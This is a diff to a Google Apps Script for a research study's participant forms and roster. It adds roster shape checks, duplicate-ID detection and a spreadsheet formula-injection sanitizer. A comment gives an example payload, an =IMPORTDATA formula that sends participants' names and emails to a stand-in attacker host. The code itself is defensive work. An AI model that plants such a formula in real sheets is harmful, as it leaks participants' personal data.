@@ -19,8 +19,18 @@
  *       3. ★ `o1AssertSafeToRebuild_` —— 回答のあるフォームは作り直さない (既定 fail-closed)
  *
  * ============================================================================
- * ★ 配備手順 (⚠️ **研究者が手で行う**。自動操作は関数セレクタに効かない)
+ * ★ 配備手順
  * ============================================================================
+ *   ⚠️★★★ **2026-08-29 に訂正した。** 旧文は「**研究者が手で行う**。自動操作は関数
+ *   セレクタに効かない」だったが、★ **実測で覆した** —— 貼り付け・関数選択・実行・
+ *   スクリプト プロパティの編集は**すべて自動操作でできる**（★ 本手順 1〜7 を完走済み）。
+ *   ⚠️ 旧記述の真因は **タブが不可視だったこと**（`visibilityState === "hidden"` のとき
+ *   入力イベントだけが黙って落ちる）。★ 詳細は
+ *   `.claude/skills/browser-verification/SKILL.md` §2.0a と
+ *   `.steering/20260829-o1-builder-config-to-properties/decisions.md` D-3。
+ *   ⚠️ **人の判断が要る箇所は変わらない**: OAuth の同意画面 / 破壊的関数を撃つ前の確認 /
+ *   フォームの共有設定。⚠️★★ **リロードすると関数セレクタは先頭 (`setupO1Forms`) に戻る**
+ *   ので、実行の直前に必ず表示を読み直すこと (★ 2026-08-07 の事故と同じ形)。
  *   1. Google Forms で **空のフォームを 2 本**作る (O1 用・G1 のものを使い回さない)。
  *   2. ⚠️★★★ **このファイルは編集しない。** ★ 設定は ⚙️ プロジェクトの設定 →
  *      **スクリプト プロパティ**に入れる (受け口 `GSE_O1_Submit.gs` と同じ規約)。
@@ -1059,6 +1069,159 @@ function o1WithRosterLock_(fn) {
   }
 }
 
+// ============================================================
+// ⚠️★★★ ロスターの「形」を確かめる (★ 段 4・起票 T-23)
+// ============================================================
+// ★ 拒否リスト `o1IsKnownWrongRoster_` は **既知の 1 枚**しか弾けない。
+//   ⚠️ 「参加者ロスター」タブを持つ**新しいシート**を指すと素通りし、
+//     **P001 から採番して実在の P-ID と衝突する**（★ 別人のデータが 1 つの ID に混ざる）。
+//   → ★ 「本物のロスターの形をしているか」を機械で見る。
+//
+// ⚠️★★ **14 列すべての一致は要求しない。** ★ 要求すると、ロスターに列を 1 つ足しただけで
+//   O1 の登録が止まる（＝ fail-closed が過剰に効く）。
+//   → ★ **O1 が実際に読み書きする先頭 4 列だけ**を守る。
+//   ⚠️ 14 列の完全一致は `o1_form_builder_test.cjs` が
+//     `Form_Phase1/GSE_Phase1_Form_Builder.gs` の `ROSTER_HEADER` と照合している
+//     （★ 2 か所に同じ定数を持つので、ずれたらテストが赤になる）。
+var O1_ROSTER_HEAD = ["P-ID", "氏名/ニックネーム", "メール", "OS"];
+
+/** 見出し行を探す範囲 (★ 実物は行 1 が機密バナー・行 2 が見出し)。 */
+var O1_ROSTER_HEADER_SCAN_ROWS = 10;
+
+/**
+ * ★ ロスターの形を検査する。問題があれば**理由の文字列**、無ければ空文字を返す。
+ * ⚠️ 「開けたから正しい」ではない。★ 中身の形まで見る。
+ */
+function o1RosterShapeProblem_(sheet) {
+  var last = sheet.getLastRow();
+  if (last < 1) {
+    return "シートが空です（⚠️ 新規に作ったシートを指していませんか）";
+  }
+  if (sheet.getMaxColumns() < O1_ROSTER_HEAD.length) {
+    return "列が " + O1_ROSTER_HEAD.length + " 列に足りません（⚠️ 参加者ロスターの形ではありません）";
+  }
+  var scan = Math.min(last, O1_ROSTER_HEADER_SCAN_ROWS);
+  var head = sheet.getRange(1, 1, scan, O1_ROSTER_HEAD.length).getValues();
+  var headerRow = -1;
+  for (var i = 0; i < head.length; i++) {
+    if (String(head[i][0]).trim() === O1_ROSTER_HEAD[0]) {
+      headerRow = i;
+      break;
+    }
+  }
+  if (headerRow < 0) {
+    return (
+      "見出し行が先頭 " + scan + " 行に見つかりません（★ A 列が「" + O1_ROSTER_HEAD[0] + "」の行）"
+    );
+  }
+  for (var c = 0; c < O1_ROSTER_HEAD.length; c++) {
+    var actual = String(head[headerRow][c]).trim();
+    if (actual !== O1_ROSTER_HEAD[c]) {
+      // ⚠️ セルの中身を**丸ごとログへ出さない**（security-checker LOW・2026-08-29）。
+      //   ★ 実行ログは削除台帳 A-10 の対象である。→ 先頭 20 文字だけにする。
+      return (
+        "見出しの " + (c + 1) + " 列目が「" + actual.slice(0, 20) + "」です（★「" +
+        O1_ROSTER_HEAD[c] + "」のはず）"
+      );
+    }
+  }
+  // ★ **データ行が 1 つも無いロスターは採番元ではない**（⚠️ 新規シートはここで落ちる）。
+  var col = sheet.getRange(1, 1, last, 1).getValues();
+  for (var r = 0; r < col.length; r++) {
+    if (o1IsValidPid_(String(col[r][0]).trim().toUpperCase())) return "";
+  }
+  // ⚠️★ 原因は 2 つありうる（cross-review 指摘・2026-08-29）。★ **両方を書く** ——
+  //   片方だけ書くと、⚠️ 正当に空なだけのロスターを「シートの取り違え」と誤診断する。
+  return (
+    "P-ID の行が 1 つもありません（⚠️ 新規に作った空のロスターを指していませんか / " +
+    "★ 移行直後などで**正当に 0 件**なら、先に 1 人を手で登録してください）"
+  );
+}
+
+/**
+ * ⚠️★★★ **ロスターへ書く値を数式にしない** (security-checker HIGH・2026-08-29)。
+ *
+ * ★ Apps Script の `appendRow` / `setValue` は **先頭が `=` の文字列を数式として格納する**。
+ * ⚠️ 氏名欄は**被験者の自由記入**で、★ フォーム URL は配られ、`setCollectEmail(false)` なので
+ *   Google 認証も要求していない。→ 誰でも次を提出できる:
+ *
+ *     =IMPORTDATA("https://attacker.example/x?d=" & TEXTJOIN(",", 1, B2:C200))
+ *
+ * ⚠️★★★ **研究者がロスターを開いた瞬間**に Sheets が URL を取りに行き、
+ *   **Phase1 / G1 / O1 で共用している全参加者の氏名とメール**が外部へ出る
+ *   （★ クリックは要らない。`=IMAGE(...)` も同型）。
+ *   ⚠️ 流出先はまさに `docs/o1-deletion-ledger.md` §5b の 1 番＝**対応表そのもの**である。
+ *
+ * ★ 先頭に `'` を付けると Sheets は「文字列」の印として扱い、⚠️ **セルの値には残らない**
+ *   （＝ 研究者が見る表示は変わらない）。
+ * ⚠️ 受け口の `sanitizeName_` は**ファイル名用**であって、ロスター書き込みには効いていなかった。
+ */
+function o1PlainText_(v) {
+  var s = String(v === null || v === undefined ? "" : v);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
+
+/**
+ * ★ ロスターの形を**読み取りだけ**で確かめる (起票 T-23 の実物確認)。
+ *
+ * ⚠️★★★ **配備したら必ず 1 度実行すること。**
+ *   ★ この検査は fail-closed なので、⚠️ 実物と食い違っていると
+ *     **最初の被験者の登録で初めて発動する**（＝ 被験者を待たせて気づく）。
+ *   ★ `checkO1FormConfig()` は**設定しか見ない**ので、ロスターの中身までは確かめられない。
+ *
+ * ⚠️ **PII を出さない**（★ 出すのは行数と判定だけ）。
+ */
+function checkO1RosterShape() {
+  var rosterSheetId = o1Config_().rosterSheetId;
+  if (!rosterSheetId) {
+    Logger.log("❌ スクリプト プロパティ PHASE1_MGMT_SHEET_ID が空です。");
+    return;
+  }
+  // ⚠️★★★ **拒否リストをここでも見る**（security-checker MEDIUM・2026-08-29）。
+  //   ★ 旧シート（`12T8WU4D…`）は**同じ見出しと P-ID の行を持つ**ので、
+  //     ⚠️ 形の検査だけでは「✅ 正しい」と言ってしまう。
+  if (o1IsKnownWrongRoster_(rosterSheetId)) {
+    Logger.log("⛔⚠️★★★ **古いほうの管理シート**を指しています（★ 形が合っていても中身が違う）。");
+    Logger.log("   ★「参加者ロスター」タブに P010 以降が入っているほうが正です。");
+    return;
+  }
+  var sheet = SpreadsheetApp.openById(rosterSheetId).getSheetByName("参加者ロスター");
+  if (!sheet) {
+    Logger.log("❌ 「参加者ロスター」タブがありません。★ ID を確認してください。");
+    return;
+  }
+  var problem = o1RosterShapeProblem_(sheet);
+  if (problem) {
+    Logger.log(
+      "⛔⚠️★★★ ロスターの形が違います: " + problem + "\n" +
+        "   ★ このままだと**登録は fail-closed で止まります**（⚠️ 被験者は P-ID を受け取れません）。\n" +
+        "   ★ 期待する見出し（1〜4 列目）: " + O1_ROSTER_HEAD.join(" / ")
+    );
+    return;
+  }
+  Logger.log("✅ ロスターの形は正しい（★ 見出し 4 列 ＋ P-ID の行あり）。");
+  Logger.log("ℹ️ 行数: " + sheet.getLastRow() + "（⚠️ 中身は出しません）");
+}
+
+/**
+ * ★ その P-ID がロスターの**どの行にあるか**を返す (起票 T-24)。
+ * ⚠️ 読めなかったときは **`null`**（★ 空配列と区別する ——
+ * 「1 行も無い」と「確かめられなかった」を同じ値にしない）。
+ */
+function o1RosterRowsForPid_(pid) {
+  var sheet = o1OpenRoster_();
+  if (!sheet) return null;
+  var last = sheet.getLastRow();
+  if (last < 1) return [];
+  var want = String(pid).trim().toUpperCase();
+  var col = sheet.getRange(1, 1, last, 1).getValues();
+  var rows = [];
+  for (var i = 0; i < col.length; i++) {
+    if (String(col[i][0]).trim().toUpperCase() === want) rows.push(i + 1);
+  }
+  return rows;
+}
+
 /** ★ ロスターのシートを開く。⚠️ 無ければ null（★ 呼び出し側が中止する）。 */
 function o1OpenRoster_() {
   var rosterSheetId = o1Config_().rosterSheetId;
@@ -1069,9 +1232,29 @@ function o1OpenRoster_() {
     );
     return null;
   }
+  // ⚠️★★★ **拒否リストを書き込み経路でも見る**（security-checker MEDIUM・2026-08-29）。
+  //   ★ 従来は `o1ConfigProblems_` だけが見ていたので、⚠️ **トリガ設置のあとに**
+  //     スクリプト プロパティを旧 ID へ書き換えられると素通りしていた
+  //     （★ `onO1ConsentSubmit` は毎回 `o1Config_()` を読み直す）。
+  //   ⚠️ 旧シートは**同じ見出しを持つ**ので、形の検査では止まらない。
+  if (o1IsKnownWrongRoster_(rosterSheetId)) {
+    Logger.log("⛔⚠️★★★ **古いほうの管理シート**を指しています。★ 発番も書き込みもしていません。");
+    Logger.log("   ⚠️ そのまま書くと **実在の P-ID と衝突**します（★ 別人のデータが 1 つの ID に混ざる）。");
+    return null;
+  }
   var sheet = SpreadsheetApp.openById(rosterSheetId).getSheetByName("参加者ロスター");
   if (!sheet) {
     Logger.log("❌ Phase1 の管理シートに「参加者ロスター」タブがありません。ID を確認してください。");
+    return null;
+  }
+  var problem = o1RosterShapeProblem_(sheet);
+  if (problem) {
+    Logger.log(
+      "⛔⚠️★★★ 指しているシートは**参加者ロスターの形をしていません**: " + problem + "\n" +
+        "   ★ 発番も書き込みもしていません（fail-closed）。\n" +
+        "   ⚠️ 別のシートを新しく作って指すと、**P001 から採番して実在の P-ID と衝突**します。\n" +
+        "   ★ 採番元は Phase1 の参加者ロスターただ 1 つです。"
+    );
     return null;
   }
   return sheet;
@@ -1370,14 +1553,26 @@ function onO1ConsentSubmit(e) {
         Logger.log("♻️ 既存の参加者として扱います: " + p + "（" + o1MaskEmail_(a.email) + "）");
       }
       if (!String(roster.getRange(found.row, 3).getValue()).trim()) {
-        roster.getRange(found.row, 3).setValue(a.email);
+        roster.getRange(found.row, 3).setValue(o1PlainText_(a.email));
+      }
+      // ★ OS も同じ規則で補う (起票 T-22)。⚠️ **空のときだけ**書く
+      //   （★ メール補充と同型。⚠️ 上書きすると研究者が手で直した値を機械が黙って戻す）。
+      if (a.os && !String(roster.getRange(found.row, 4).getValue()).trim()) {
+        roster.getRange(found.row, 4).setValue(o1PlainText_(a.os));
       }
       SpreadsheetApp.flush(); // ★ ロック解放前に確定させる
       return p;
     }
 
     var newPid = o1NextParticipantId_(roster);
-    roster.appendRow([newPid, a.name, a.email]);
+    // ★ D 列 = OS (起票 T-22)。⚠️ ロスターの列順は Phase1 の `ROSTER_HEADER` で固定
+    //   （逐語:「列順に依存するため変更不可」）なので、位置で書いてよい。
+    roster.appendRow([
+      newPid,
+      o1PlainText_(a.name),
+      o1PlainText_(a.email),
+      o1PlainText_(a.os || ""),
+    ]);
     SpreadsheetApp.flush(); // ★ ロック解放前に確定させる
     Logger.log("✅ P-ID 発番: " + newPid + "（" + o1MaskEmail_(a.email) + "）");
     return newPid;
@@ -1385,6 +1580,44 @@ function onO1ConsentSubmit(e) {
 
   if (!pid) {
     Logger.log("❌ 発番できませんでした（★ 回答は失われていません）。上のログの理由を見てください。");
+    return;
+  }
+
+  // ============================================================
+  // ⚠️★★★ 採番の排他は**プロジェクトを跨がない** (起票 T-24)
+  // ============================================================
+  // ★ `LockService.getScriptLock()` は**スクリプト プロジェクト単位**である。
+  //   ⚠️ G1 (`GSE_G1_Form_Builder.gs`) と Phase1 は**別プロジェクト = 別のロック**なので、
+  //     ★ G1-C と O1-C がほぼ同時に提出されると **両方が同じ「最大値 + 1」を読む**。
+  //   ⚠️ 別プロジェクトにすること自体は 2026-08-07 の事故対策で**必須**なので、構成は変えられない。
+  //   → ★ **書いたあとに読み返して、重複していたら受付メールを送らない**。
+  //
+  // ⚠️★★★ **これは「重複を防ぐ」仕組みではない。窓を狭めるだけである**
+  //   （cross-review の Codex 指摘・2026-08-29）:
+  //     ★ 読み返した**あと**に他プロジェクトが同じ P-ID を append する順序は防げない
+  //       （＝ TOCTOU）。⚠️ その場合、**こちらは送ってしまう**。
+  //     ⚠️ さらに **G1 側には同等の検査が無い**（★ G1 実施中で触れないため）。
+  //       → ★ G1 が先に送れば、**こちら側で止めても被験者には重複 ID が渡る**。
+  //   ★ 正しく防ぐには**採番を 1 か所に集約する**しかない（⚠️ G1 を触るので今はできない）。
+  //   → ★ したがって本検査の役割は「**気づけない状態を無くす**」ことである。
+  //   ⚠️ 重複した P-ID を被験者に渡すと**回収できない**（★ その ID で `.age` /
+  //     `metrics/<PID>/` が作られ、2 人ぶんが 1 つの P-ID に混ざる → 削除要求が履行不能）。
+  var dupRows = o1RosterRowsForPid_(pid);
+  if (dupRows === null) {
+    // ★ 検査そのものが失敗した場合は**送る**。⚠️ 読み取りの失敗で被験者を止めない
+    //   （★ 直前に書き込めているので、ここで開けないのは一過性の可能性が高い）。
+    Logger.log("⚠️ ★ P-ID の重複検査ができませんでした（★ 受付メールは送ります）: " + pid);
+  } else if (dupRows.length > 1) {
+    Logger.log(
+      "⛔⚠️★★★ **同じ P-ID が " + dupRows.length + " 行あります**: " + pid +
+        "（行 " + dupRows.join(" / ") + "）\n" +
+        "   ★ 受付メールは**送っていません**（⚠️ 重複した ID を配ると回収できません）。\n" +
+        "   ⚠️ 別プロジェクト（G1 / Phase1）と**同時に採番された**可能性があります ——\n" +
+        "      ★ LockService はスクリプト プロジェクト単位で、跨いだ排他は効きません。\n" +
+        "   ★ どちらの行を残すかは**研究者が決めてください**（⚠️ 自動では直しません）。\n" +
+        "   ★ 直したあと、提出者にもう一度提出してもらえば同じ経路で受付メールが送られます。\n" +
+        "   提出者: " + o1MaskEmail_(a.email) + "（OS: " + a.os + "）"
+    );
     return;
   }
 
